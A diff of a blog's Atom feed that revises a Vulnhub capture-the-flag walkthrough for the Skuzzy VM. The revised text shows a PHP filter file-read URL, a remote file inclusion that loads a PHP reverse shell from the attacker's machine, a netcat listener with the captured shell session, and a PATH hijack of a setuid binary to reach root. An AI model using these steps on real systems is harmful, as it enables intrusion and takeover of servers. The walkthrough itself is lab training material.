@@ -4,7 +4,7 @@
   <title><![CDATA[Category: Vulnhub | CyberSlave]]></title>
   <link href="http://ryanoberto.github.io/blog/categories/vulnhub/atom.xml" rel="self"/>
   <link href="http://ryanoberto.github.io/"/>
-  <updated>2017-03-28T12:54:03+02:00</updated>
+  <updated>2017-03-28T13:10:44+02:00</updated>
   <id>http://ryanoberto.github.io/</id>
   <author>
     <name><![CDATA[Ryan Oberto]]></name>
@@ -353,7 +353,7 @@ Soup Nazi: NO FLAG FOR YOU
 </span><span class='line'>// Oh. That flag above? You&rsquo;re gonna need it&hellip;
 </span><span class='line'>?&gt;</span></code></pre></td></tr></table></div></figure></p>
 
-<p>Download the reader source</p>
+<p>Download reader.php source</p>
 
 <p><a href="http://10.0.2.6/c2444910794e037ebd8aaf257178c90b/?p=php://filter/convert.base64-encode/resource=reader.php">http://10.0.2.6/c2444910794e037ebd8aaf257178c90b/?p=php://filter/convert.base64-encode/resource=reader.php</a></p>
 
@@ -441,27 +441,46 @@ We know from the above code we require a key and that it needs to be 47 char lon
 
 http://10.0.2.6/c2444910794e037ebd8aaf257178c90b/?p=reader&amp;key=flag4{4e44db0f1edc3c361dbf54eaf4df40352db91f8b}&amp;url=http://10.0.2.6/c2444910794e037ebd8aaf257178c90b/data.txt
 
+<img src="https://ryanoberto.github.io/images/ew_lfi.png">
 
-https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
+Using the following [reverse shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) copied to the webserver directory renamed to data.txt
+and changed the &lt;?php ?&gt; to ##php##
 
+Setup listener
+</code></pre>
 
+<p>~/EW_Skuzzy # nc -lvp 8888             <br/>
+listening on [any] 8888 &hellip;</p>
 
+<pre><code>
+Browse to the url
 
+http://10.0.2.6/c2444910794e037ebd8aaf257178c90b/?p=reader&amp;key=flag4{4e44db0f1edc3c361dbf54eaf4df40352db91f8b}&amp;url=http://10.0.2.5/data.txt
 
-~/EW_Skuzzy # nc -lvp 8888               
-listening on [any] 8888 ...
+<img src="https://ryanoberto.github.io/images/ew_rfi.png">
+</code></pre>
 
-http://192.168.56.101/c2444910794e037ebd8aaf257178c90b/?p=reader&amp;key=flag4{4e44db0f1edc3c361dbf54eaf4df40352db91f8b}&amp;url=http://192.168.56.102/data.txt
+<p>/opt # nc -lvp 8888
+listening on [any] 8888 &hellip;
+10.0.2.6: inverse host lookup failed: Unknown host
+connect to [10.0.2.5] from (UNKNOWN) [10.0.2.6] 58060
+Linux skuzzy 4.4.0-64-generic #85-Ubuntu SMP Mon Feb 20 11:50:30 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
+ 01:12:56 up  6:40,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can&rsquo;t access tty; job control turned off
+&#8220;`</p>
 
+<p>Baam we have a reverse shell, lets improve it</p>
 
-
-python -c 'import pty;pty.spawn("/bin/bash")'
+<pre><code>$ python -c 'import pty;pty.spawn("/bin/bash")'
+www-data@skuzzy:/$ export TERM=xterm
 export TERM=xterm
+www-data@skuzzy:/$
+</code></pre>
 
-
-exploit
-https://www.exploit-db.com/exploits/40616/
-
+<p>lets find some setuid files
+<code>
 www-data@skuzzy:/$ find / -perm -4000 2&gt;/dev/null
 find / -perm -4000 2&gt;/dev/null
 /usr/lib/policykit-1/polkit-agent-helper-1
@@ -488,37 +507,38 @@ find / -perm -4000 2&gt;/dev/null
 /bin/ping6
 /bin/umount
 /opt/alicebackup
+</code></p>
 
+<p>cat /tmp/id</p>
 
-cat /tmp/id
-#!/bin/bash
-/bin/bash
+<h1>!/bin/bash</h1>
 
-export PATH=/tmp
+<p>/bin/bash</p>
 
-www-data@skuzzy:/opt$ ./alicebackup
+<p>export PATH=/tmp</p>
+
+<p>www-data@skuzzy:/opt$ ./alicebackup
 ./alicebackup
 bash: groups: command not found
-root@skuzzy:/opt# 
-root@skuzzy:/opt# export PATH=/usr/local/bin:/usr/local/sbin:/usr/bin:/usr/sbin:/bin:/sbin
-</code></pre>
+root@skuzzy:/opt#
+root@skuzzy:/opt# export PATH=/usr/local/bin:/usr/local/sbin:/usr/bin:/usr/sbin:/bin:/sbin</p>
 
-<p>root@skuzzy:/root# cat flag.txt
-Congratulations!</p>
+<pre><code>root@skuzzy:/root# cat flag.txt
+Congratulations!
 
-<p>flag5{42273509a79da5bf49f9d40a10c512dd96d89f6a}</p>
+flag5{42273509a79da5bf49f9d40a10c512dd96d89f6a}
 
-<p>You&rsquo;ve found the final flag and pwned this CTF VM!</p>
+You've found the final flag and pwned this CTF VM!
 
-<p>I really hope this was an enjoyable challenge, and that my trolling and messing with you didn&rsquo;t upset you too much! I had a blast making this VM, so it won&rsquo;t be my last!</p>
+I really hope this was an enjoyable challenge, and that my trolling and messing with you didn't upset you too much! I had a blast making this VM, so it won't be my last!
 
-<p>I&rsquo;d love to hear your thoughts on this one.
+I'd love to hear your thoughts on this one.
 Too easy?
 Too hard?
-Too much stuff to install to get the iSCSI initiator working?</p>
+Too much stuff to install to get the iSCSI initiator working?
 
-<p>Drop me a line on twitter @vortexau, or via email <a href="&#x6d;&#x61;&#105;&#108;&#x74;&#x6f;&#x3a;&#118;&#111;&#114;&#116;&#101;&#120;&#x40;&#106;&#x75;&#x69;&#99;&#x65;&#100;&#x69;&#x67;&#105;&#116;&#x61;&#x6c;&#x2e;&#x6e;&#x65;&#116;">&#x76;&#111;&#x72;&#116;&#x65;&#120;&#x40;&#106;&#x75;&#x69;&#x63;&#x65;&#100;&#x69;&#103;&#105;&#116;&#x61;&#x6c;&#x2e;&#110;&#101;&#116;</a>
-&#8220;`</p>
+Drop me a line on twitter @vortexau, or via email vortex@juicedigital.net
+</code></pre>
 
 <p>This was great fun and learnt something new, Thanks <a href="https://twitter.com/@vortexau">@vortexau</a></p>
 ]]></content>
